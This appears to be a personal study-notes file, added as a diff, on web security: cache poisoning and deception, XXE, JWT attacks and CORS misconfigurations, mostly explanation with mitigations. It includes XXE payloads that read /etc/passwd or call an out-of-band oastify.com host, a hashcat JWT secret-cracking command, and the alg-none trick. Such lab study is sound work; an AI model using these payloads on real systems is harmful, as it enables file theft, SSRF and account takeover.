@@ -1,0 +1,232 @@
+Lab: Web cache poisoning with an unkeyed header
+
+Writeup:
+https://medium.com/@appsecwarrior/web-cache-poisoning-attack-1459e65e3774
+https://mounick.medium.com/http-cache-poisoning-a-security-blog-dcd88d0e700e
+https://amsghimire.medium.com/web-cache-poisoning-1558f2aa41ef
+
+A Web Cache Poisoning Attack is a type of cyberattack that targets web caches, with the goal of manipulating the cached content served to users. Web caches are used to store frequently accessed web content (e.g., HTML pages, images, JavaScript) to speed up response times and reduce server load.
+In a web cache poisoning attack, an attacker exploits weaknesses in the way the caching mechanism works to inject malicious or unauthorized content into the cache. Once the content is cached, it is served to users who access the affected resources, potentially causing various harmful outcomes like data leakage, phishing attacks, defacement of web pages, or spreading malicious payloads.
+Key Aspects of Web Cache Poisoning:
+	1. Exploiting Cache Behavior: Caching systems often store content based on factors like URL, HTTP headers (e.g., user-agent, cookies), or query parameters. Attackers can manipulate these factors to trick the cache into storing malicious content for legitimate users.
+	2. Cache Key Manipulation: If the cache uses a simple or predictable mechanism for identifying cache keys, attackers can modify headers, URL parameters, or other data that affect cache storage, causing the cache to serve poisoned content.
+	3. Impact:
+		○ Security risks: Injected malicious content can lead to cross-site scripting (XSS), information theft, or redirection to malicious sites.
+		○ Data Integrity: Legitimate users may unknowingly receive altered or outdated content, leading to trust issues or incorrect information.
+		○ Phishing: Attackers can serve fake login pages or phishing forms via the cache to collect sensitive user credentials.
+	4. Prevention Measures:
+		○ Use cache control headers like Cache-Control, Vary, and Pragma to prevent caching of sensitive or dynamic content.
+		○ Implement more granular cache key mechanisms (e.g., including full session data or request parameters in the cache key).
+		○ Regularly audit and review caching configurations to ensure they don't inadvertently allow poisoning.
+
+Example Scenario:
+An attacker might manipulate the User-Agent header or URL query parameters in a request to cause a server to cache a harmful version of a webpage (e.g., a login page that sends credentials to the attacker). Subsequent users who visit the site might unknowingly receive this poisoned content, potentially entering sensitive information.
+
+---------------------------------------------
+
+Web cache deception is a security vulnerability that exploits how caching mechanisms store and serve web content. It typically involves tricking a caching server into caching sensitive information that should not be cached. 
+
+Impact:
+	• Data Exposure: Sensitive information may be exposed to unauthorized users.
+	• User Privacy Violation: Personal or private data can be leaked, leading to privacy breaches.
+	• Reputation Damage: Affected organizations may suffer reputational harm due to data leaks.
+
+Mitigation:
+	• Cache Control Headers: Implement appropriate cache control headers to specify which content should be cached and for how long.
+	• Validation: Ensure proper validation of URLs and responses, particularly for dynamic or sensitive content.
+	• User Authentication: Require authentication for access to sensitive data, ensuring it cannot be accessed without proper credentials.
+	• Testing and Audits: Regularly test web applications for cache-related vulnerabilities and conduct security audits.
+
+How It Works
+	1. Caching Mechanisms: Many web applications use caching to enhance performance, serving cached copies of frequently accessed content instead of generating it anew for each request.
+	2. URL Manipulation: An attacker can craft a URL that appears benign but leads the cache to store sensitive content (like user data or private files) under a public-facing URL.
+	3. Cache Misconfiguration: This vulnerability often arises from improper cache settings, where sensitive responses might be cached based on insufficient validation.
+
+Steps in an Attack
+	1. Preparation: The attacker identifies a web application that uses caching and can be manipulated through specific URLs.
+	2. Creating Deceptive Content: The attacker may create a public URL that, when accessed, triggers the caching mechanism to store sensitive content.
+	3. Accessing Cached Content: Once the sensitive content is cached, the attacker can retrieve it by accessing the URL where it is publicly stored.
+
+------------------------------------------
+
+It allows an attacker to interfere with the processing of XML data and can lead to various exploits, including data exposure and denial of service. 
+
+How XXE Works
+	a. External Entities: XML allows the definition of entities, which can reference external resources, such as files or URLs.
+	b. User Input: An application processes XML input that includes these external entity definitions.
+	c. Data Leakage: The server can be tricked into fetching sensitive information or executing unintended actions based on the attacker’s XML payload.
+
+Impact:
+	• Data Exposure: Access to sensitive files and data on the server.
+	• Service Manipulation: Ability to interact with internal services, potentially leading to further attacks.
+	• Denial of Service: Crashing the server or exhausting resources through specially crafted XML.
+	
+Mitigation:
+	• Disable External Entity Processing: Configure XML parsers to disable the processing of external entities.
+	• Input Validation: Validate and sanitize XML input to ensure it adheres to expected formats.
+	• Use Secure Parsers: Choose libraries or parsers that have built-in protections against XXE.
+	• Access Controls: Implement strict access controls and network segmentation to minimize the impact of potential exploitation.
+
+Common Scenarios
+	• File Disclosure: Attackers can craft an XML payload that requests sensitive files from the server, such as /etc/passwd on Unix systems.
+	• Server-side Request Forgery (SSRF): XXE can be used to make requests to internal services that should not be accessible externally.
+	• Denial of Service (DoS): An attacker might create a malicious XML input that causes the server to hang or crash, such as via entity expansion attacks (Billion Laughs attack).
+
+Example of an XXE Attack
+	Vulnerable XML Parsing Code:
+		xml
+		Copy code
+		<note>
+  <to>Tove</to>
+  <from>Jani</from>
+  <heading>Reminder</heading>
+  <body>Don't forget me this weekend!</body>
+</note>
+	Malicious XML Input:
+		xml
+		Copy code
+		<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<note>
+  <to>&xxe;</to>
+  <from>Jani</from>
+  <heading>Reminder</heading>
+  <body>Don't forget me this weekend!</body>
+</note>
+Impact: If the application processes this XML without proper validation, it might expose the contents of /etc/passwd.
+
+
+XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
+
+Why we use XML? 
+	1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens. 
+	2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation. 
+	3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error. 
+	4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.
+	
+Identify If application allows to create an external entity
+
+<!DOCTYPE replace [<!ENTITY ext "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&ext;</lastName>
+ </userInfo>
+
+
+1. To retrieve files:
+	a. Find a request where data is passed through XML
+	b. Enter the payload	<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
+	Determine from where the app is fetching the value and replace it with	&ext;
+
+2. XXE to SSRF:
+	a. Find a request where data is passed through XML
+	b. Enter the payload	<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://66adv84bg4swmoro1xafkakj8ae12rqg.oastify.com" > ]>
+	Determine from where the app is fetching the value and replace it with	&ext;
+-------------------------------------------------------
+JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. 
+They can theoretically contain any kind of data, but are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.
+
+Most used default algorithms used:
+	a. HS256 (symmetric)
+	b. RS256 (asymmetric)
+
+The structure of a JWT token is formed of 3 parts each base base64 URL encoded and separated by dots:
+	i) header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. 
+	ii) payload contains the key-value pairs with the data that the web application wants the client to store.
+	iii) signature is similar to a hash, taken to verify the payload's integrity. 
+	
+If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.
+
+Signing Algorithms
+
+	1. None - The None algorithm means no algorithm is used for the signature. Effectively, this is a JWT without a signature, meaning that the verification of the claims provided in the JWT cannot be verified through the signature.
+	2. Symmetric Signing - A symmetric signing algorithm, such as HS265, creates the signature by appending a secret value to the header and body of the JWT before generating a hash value. Verification of the signature can be performed by any system that has knowledge of the secret key.
+	3. Asymmetric Signing - An asymmetric signing algorithm, such as RS256, creates the signature by using a private key to sign the header and body of the JWT. This is created by generating the hash and then encrypting the hash using the private key. Verification of the signature can be performed by any system that has knowledge of the public key associated with the private key that was used to create the signature.
+
+Impact
+The impact of JWT attacks is usually severe. If an attacker is able to create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full control of their accounts.
+
+Use cases:
+	1. Unverified signature, simple tampering the fields the server will not verify the signature
+	2. Set the algorithm to None and remove signature, Remember to add a DOT after payload
+	3. Brute force secret keys (if algo is HS256)
+		a. Command:	hashcat -a 0 -m 16500 <jwt> <wordlist>
+		Wordlist	https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
+		JWT.io	Enter secret in signature and then modify the token
+		
+	4. Signature Algorithm Confusion
+		In a typical JWT implementation, the signature is generated based on a header, payload, and a secret key or private key depending on the algorithm used:
+			• HMAC (e.g., HS256): A symmetric key (shared secret).
+			• RSA or ECDSA (e.g., RS256, ES256): An asymmetric key (public/private key pair).
+		However, attackers can exploit situations where the algorithm field in the JWT header is not properly validated or handled. 
+		It specifically happens with confusion between symmetric and asymmetric signing algorithms. If an asymmetric signing algorithm, for example, RS256 is used, it may be possible to downgrade the algorithm to HS256. In these cases, some libraries would default back to using the public key as the secret for the symmetric signing algorithm. Since the public key can be known, you can forge a valid signature by using the HS256 algorithm in combination with the public key. Sometimes, the public key is even embedded as a claim in the JWT. 
+	5. Cross-Service Relay Attack
+		A JWT Cross-Service Relay Attack is a type of attack that exploits JWT (JSON Web Tokens) in a multi-service architecture, where an attacker uses a legitimate JWT issued for one service to impersonate a user or perform unauthorized actions on another service. This attack often targets the way JWTs are issued and validated across different services, and it can be particularly dangerous if the services fail to properly verify claims, including the audience (aud) claim, within the token.
+		FIX: The audience claim should be verified when the token is decoded.
+-------------------------------
+Cross-Origin Resource Sharing (CORS) is a mechanism defined by HTTP headers that allows servers to specify how resources can be requested from different origins. 
+While the Same-Origin Policy (SOP) restricts web pages by default to making requests to the same domain, CORS enables servers to declare exceptions to this policy, allowing web pages to request resources from other domains under controlled conditions.
+
+Impact:
+	1. Data Theft: Attackers can use CORS vulnerabilities to steal sensitive data from applications like API keys, SSH keys, Personal identifiable information (PII), or users’ credentials.
+	2. Cross-Site Scripting (XSS): Attackers can use CORS vulnerabilities to perform XSS attacks by injecting malicious scripts into web pages to steal session tokens or perform unauthorized actions on behalf of the user.
+
+Remediation:
+	1. Implement proper CORS headers: The server can add appropriate CORS headers to allow cross-origin requests from only trusted sites.
+	2. Restrict access to sensitive data: It is important to restrict access to sensitive data to only trusted domains. This can be done by implementing access control measures such as authentication and authorization.
+
+
+SOP (Same Origin Polity)
+
+According to this policy, a script/images/stylesheet on one web page can access data on another only if both pages share the same origin. This "origin" is identified by combining the URI scheme, hostname, and port number. The image below shows what a URL looks like with all its features (it does not use all features in every request).
+	Examples of SOP
+		a. Same domain, different port: A script from https://test.com:80 can access data from https://test.com:80/about, as both share the same protocol, domain, and port. However, it cannot access data from https://test.com:8080 due to a different port.
+		b. HTTP/HTTPS interaction: A script running on http://test.com (non-secure HTTP) is not allowed to access resources on https://test.com (secure HTTPS), even though they share the same domain because the protocols are different.
+
+Different HTTP Headers Involved in CORS
+	1. Access-Control-Allow-Origin: This header specifies which domains are allowed to access the resources. For example, Access-Control-Allow-Origin: example.com allows only requests from example.com.
+	2. Access-Control-Allow-Methods: Specifies the HTTP methods (GET, POST, etc.) that can be used during the request.
+	3. Access-Control-Allow-Headers: Indicates which HTTP headers can be used during the actual request.
+	4. Access-Control-Max-Age: Defines how long the results of a preflight request can be cached.
+	5. Access-Control-Allow-Credentials: This header instructs the browser whether to expose the response to the frontend JavaScript code when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request. If Access-Control-Allow-Credentials is set to true, it allows the browser to access the response from the server when credentials are included in the request. It's important to note that when this header is used, Access-Control-Allow-Origin cannot be set to * and must specify an explicit domain to maintain security.
+
+Common Scenarios Where CORS is Applied
+	1. APIs and Web Services: When a web application from one domain needs to access an API hosted on a different domain, CORS enables this interaction. For instance, a frontend application at example-client.com might need to fetch data from example-api.com.
+	2. Content Delivery Networks (CDNs): Many websites use CDNs to load libraries like jQuery or fonts. CORS enables these resources to be securely shared across different domains.
+	3. Third-Party Plugins/Widgets: Enabling features like social media buttons or chatbots from external sources on a website.
+	4. Multi-Domain User Authentication: Services that offer single sign-on (SSO) or use tokens (like OAuth) to authenticate users across multiple domains rely on CORS to exchange authentication data securely.
+
+Simple Requests vs. Preflight Requests
+There are two primary types of requests in CORS: simple requests and preflight requests.
+	1. Simple Requests: These requests meet certain criteria set by CORS that make them "simple". They are treated similarly to same-origin requests, with some restrictions. A request is considered simple if it uses the GET, HEAD, or POST method, and the POST request's Content-Type header is one of application/x-www-form-urlencoded, multipart/form-data, or text/plain. Additionally, the request should not include custom headers that aren't CORS-safe listed. Simple requests are sent directly to the server with the Origin header, and the response is subject to CORS policy enforcement based on the Access-Control-Allow-Origin header. Importantly, cookies and HTTP authentication data are included in simple requests if the site has previously set such credentials, even without the Access-Control-Allow-Credentials header being true.
+	2. Preflight Requests: These are CORS requests that the browser "preflights" with an OPTIONS request before sending the actual request to ensure that the server is willing to accept the request based on its CORS policy. Preflight is triggered when the request does not qualify as a "simple request", such as when using HTTP methods other than GET, HEAD, or POST, or when POST requests are made with another Content-Type other than the allowed values for simple requests, or when custom headers are included. The preflight OPTIONS request includes headers like Access-Control-Request-Method and Access-Control-Request-Headers, indicating the method and custom headers of the actual request. The server must respond with appropriate CORS headers, such as Access-Control-Allow-Methods, Access-Control-Allow-Headers, and Access-Control-Allow-Origin to indicate that the actual request is permitted. If the preflight succeeds, the browser will send the actual request with credentials included if Access-Control-Allow-Credentials is set to true.
+
+Access-Control-Allow-Origin (ACAO) header
+
+ACAO is used by servers to indicate whether the resources on a website can be accessed by a web page from a different origin. This header is part of the HTTP response provided by the server.
+
+ACAO Configurations
+	1. Single Origin:
+		○ Configuration: Access-Control-Allow-Origin: https://example.com
+		○ Implication: Only requests originating from https://example.com are allowed. This is a secure configuration, as it restricts access to a known, trusted origin.
+	2. Multiple Origins:
+		○ Configuration: Dynamically set based on a list of allowed origins.
+		○ Implication: Allows requests from a specific set of origins. While this is more flexible than a single origin, it requires careful management to ensure that only trusted origins are included.
+	3. Wildcard Origin:
+		○ Configuration: Access-Control-Allow-Origin: *
+		○ Implication: Permits requests from any origin. This is the least secure configuration and should be used cautiously. It's appropriate for publicly accessible resources that don't contain sensitive information.
+	4. With Credentials:
+		○ Configuration: Access-Control-Allow-Origin set to a specific origin (wildcards not allowed), along with Access-Control-Allow-Credentials: true
+		○ Implication: Allows sending of credentials, such as cookies and HTTP authentication data, to be included in cross-origin requests. However, it's important to note that browsers will send cookies and authentication data without the Access-Control-Allow-Credentials header for simple requests like some GET and POST requests. For preflight requests that use methods other than GET/POST or custom headers, the Access-Control-Allow-Credentials header must be true for the browser to send credentials.
+
+Common CORS Misconfigurations
+	
+	1. Null Origin Misconfiguration: This occurs when a server accepts requests from the "null" origin. This can happen in scenarios where the origin of the request is not a standard browser environment, like from a file (file://) or a data URL. An attacker could craft a phishing email with a link to a malicious HTML file. When the victim opens the file, it can send requests to the vulnerable server, which incorrectly accepts these as coming from a 'null' origin. Servers should be configured to explicitly validate and not trust the 'null' origin unless necessary and understood.
+	2. Bad Regex in Origin Checking: Improperly configured regular expressions in origin checking can lead to accepting requests from unintended origins. For example, a regex like /example.com$/ would mistakenly allow badexample.com. An attacker could register a domain that matches the flawed regex and create a malicious site to send requests to the target server. Another example of lousy regex could be related to subdomains. For example, if domains starting with example.com is allowed, an attacker could use example.com.attacker123.com. The application should ensure that regex patterns used for validating origins are thoroughly tested and specific enough to exclude unintended matches.
+	3. Trusting Arbitrary Supplied Origin: Some servers are configured to echo back the Origin header value in the Access-Control-Allow-Origin response header, effectively allowing any origin. An attacker can craft a custom HTTP request with a controlled origin. Since the server echoes this origin, the attacker's site can bypass the SOP restrictions. Instead of echoing back origins, maintain an allowlist of allowed origins and validate against it.
+
+ACAO: * is SAFE when publicly accessible resources that do not contain sensitive information and do not rely on cookies or authentication tokens for access control may safely use a wildcard ACAO header.
+
+
+-----------------------------------------------------
